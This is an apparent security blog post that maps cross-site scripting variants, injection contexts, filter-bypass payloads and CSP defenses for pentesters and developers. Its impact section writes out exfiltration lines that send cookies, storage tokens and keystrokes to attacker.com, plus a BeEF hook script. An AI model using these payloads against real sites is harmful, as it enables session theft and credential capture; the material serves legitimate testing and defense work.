---
title: "Cross-Site Scripting: A Practical Attack Surface Map"
description: "A hands-on breakdown of XSS variants — reflected, stored, DOM-based — with real payload patterns and mitigation strategies for pentesters and developers."
date: 2026-02-20
tags:
  - web-security
  - XSS
  - pentesting
  - javascript
author: newbiefromcoma
---

## What is XSS and Why It Still Dominates Bug Bounties

Cross-Site Scripting (XSS) has topped OWASP lists for over a decade and continues to be one of the most consistently rewarded vulnerability classes on platforms like HackerOne and Bugcrowd. Despite widespread awareness, it persists because the attack surface grows with every new JavaScript framework, every third-party widget, and every reactive SPA route.

This writeup is a practical map, not a tutorial. Assume you can already inject `<script>alert(1)</script>` — the goal here is to understand the attack taxonomy, enumerate bypass patterns, and know when each variant matters for real impact.

## The Three Variants

### Reflected XSS

The payload travels in the request (query parameter, POST body, header) and the server reflects it back unsanitized in the HTTP response. No persistence — victim must click a crafted link.

**When it matters:** URL-based injection where the parameter appears in a `<title>`, attribute, or JS context. Redirect parameters are classic. `?next=`, `?url=`, `?return=`.

**Minimal trigger (HTML context):**
```html
<script>document.write(location.search)</script>
<!-- inject: ?q=<img src=x onerror=alert(document.domain)> -->
```

**JS context escape:**
```javascript
// Vulnerable sink:
var search = "INJECT_HERE";

// Payload:
";alert(document.domain);//
```

### Stored XSS

Payload persists in the backend (database, log, config) and executes in every victim's browser that renders the infected page. High severity because it's self-propagating.

**Classic targets:** user display names, bio fields, comment bodies, file upload names that render in the UI, SVG uploads (`<svg onload>`), markdown renderers with lax sanitization.

**Markdown renderer bypass (common pattern):**
```markdown
[click me](javascript:alert(document.cookie))
```

Many markdown parsers don't sanitize `javascript:` URIs in link hrefs. Test with `javascript:void(0)` first to confirm the scheme passes through.

### DOM-Based XSS

The vulnerability lives entirely in client-side JavaScript. The server returns a safe response; the browser's own JS reads attacker-controlled data (`location.hash`, `document.referrer`, `postMessage`) and writes it to a dangerous sink.

**Dangerous sources:**
- `location.hash`
- `location.search` parsed without `encodeURIComponent`
- `document.referrer`
- `window.name`
- `postMessage` data (especially cross-origin)

**Dangerous sinks:**
- `innerHTML`, `outerHTML`
- `document.write()`, `document.writeln()`
- `eval()`, `setTimeout(string)`, `setInterval(string)`
- `.src`, `.href` set from input
- jQuery: `$(selector)`, `$.parseHTML()`

**postMessage sink example:**
```javascript
// Vulnerable handler
window.addEventListener("message", function(e) {
  document.getElementById("output").innerHTML = e.data;
});

// Attacker sends from controlled origin:
targetWindow.postMessage("<img src=x onerror=alert(1)>", "*");
```

## Context Breakdown: Where the Payload Lands

The encoding requirements differ completely depending on the injection context.

| Context | Example | Escape sequence needed |
|---|---|---|
| HTML body | `<p>INJECT</p>` | `<tag>` or `entity` |
| HTML attribute (quoted) | `<a href="INJECT">` | `"` → close attr |
| HTML attribute (unquoted) | `<a href=INJECT>` | space/`>` breaks context |
| JS string (single-quoted) | `var x = 'INJECT';` | `'` to break string |
| JS string (double-quoted) | `var x = "INJECT";` | `"` to break string |
| JS template literal | `` var x = `INJECT`; `` | `` ` `` or `${}` |
| HTML comment | `<!-- INJECT -->` | `-->` to break comment |
| `<script>` block | `<script>INJECT</script>` | `</script>` to break block |
| CSS | `style="INJECT"` | `)url(javascript:` or expression |

## Bypass Patterns

WAFs and naive sanitizers fail in predictable ways.

**Case variation:**
```html
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>
```

**Null byte (old IIS/ASP bypass):**
```
<scr%00ipt>alert(1)</scr%00ipt>
```

**Tag attribute splitting:**
```html
<svg/onload=alert(1)>
<img src="x"onerror="alert(1)">
```

**HTML entity inside attribute:**
```html
<a href="&#106;avascript:alert(1)">click</a>
```

**Unicode normalization:**
```
<script>alert(1)</script>
```

**Polyglot (hits multiple contexts):**
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

## Chaining XSS for Impact

A bare `alert(1)` only proves injection. Real impact chains look like:

1. **Cookie theft:** `fetch('https://attacker.com/?c='+document.cookie)` — only works on cookies without `HttpOnly`.
2. **Session hijack via localStorage:** `fetch('https://attacker.com/?t='+localStorage.getItem('token'))`
3. **CSRF bypass:** XSS in same origin can make authenticated requests. Exfiltrate CSRF tokens, then forge state-changing requests.
4. **Keylogger:**
   ```javascript
   document.addEventListener('keydown', e =>
     fetch('https://attacker.com/k?k='+e.key)
   );
   ```
5. **Phishing overlay:** Replace login form in-place. Credible because URL bar shows legit domain.
6. **BeEF hook:** `<script src="https://attacker.com/hook.js"></script>` — gives browser exploitation framework access.

## CSP as a Defense Layer

A strict Content Security Policy is the most effective mitigation against XSS impact. Understanding bypass techniques helps assess CSP strength in engagements.

**Weak CSP (exploitable):**
```
Content-Security-Policy: script-src 'unsafe-inline' 'unsafe-eval' *;
```
This is worse than no CSP — it implies false confidence.

**JSONP bypass (CDN whitelist):**
If the policy trusts `cdn.example.com` and that CDN hosts a JSONP endpoint, an attacker can load arbitrary JS through it.

**`strict-dynamic` + nonce (strong):**
```
Content-Security-Policy: script-src 'nonce-{random}' 'strict-dynamic';
```
Nonce must be cryptographically random per response. `strict-dynamic` allows dynamically added scripts via trusted scripts but blocks inline injection.

## Quick Testing Checklist

- [ ] Inject into every user-controlled field and observe reflected output
- [ ] Test file upload filenames — look for them rendered in the UI
- [ ] Search for `document.write`, `innerHTML`, `eval`, `.src =` in JS bundles
- [ ] Trace `location.hash` and `location.search` to DOM sinks
- [ ] Check postMessage handlers with `*` origin wildcard
- [ ] Look for third-party widgets (chat, analytics) — they're common stored XSS targets
- [ ] Test markdown/rich-text fields for `javascript:` href and SVG payload support
- [ ] Verify CSP headers are present and non-trivial

## Conclusion

XSS is rarely about the `<script>` tag anymore. The attack surface has shifted to DOM sinks fed by `postMessage`, `history.pushState` callbacks, and client-side template engines. The bypass catalogue grows every time a new framework ships a new reactive rendering path. Enumerate contexts carefully, understand encoding requirements for each, and always chain to a real impact beyond a pop-up.
